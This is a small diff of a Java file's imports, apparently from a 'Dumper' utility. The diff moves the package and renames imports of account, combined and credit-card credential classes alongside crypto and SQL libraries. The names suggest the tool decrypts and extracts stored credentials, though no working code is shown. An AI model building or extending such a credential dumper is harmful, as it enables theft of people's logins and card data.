@@ -1,8 +1,8 @@
-package Utils.Dumper;
+package Utils;
 
-import Information.Packets.AccountCredentials;
-import Information.Packets.CombinedCredentials;
-import Information.Packets.CreditCardCredentials;
+import Packets.Credentials.AccountCredentials;
+import Packets.Credentials.CombinedCredentials;
+import Packets.Credentials.CreditCardCredentials;
 
 import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
@@ -16,8 +16,6 @@ import java.security.NoSuchAlgorithmException;
 import java.sql.*;
 import java.util.ArrayList;
 import java.util.Arrays;
-import Utils.Time;
-
 
 
 import java.util.List;
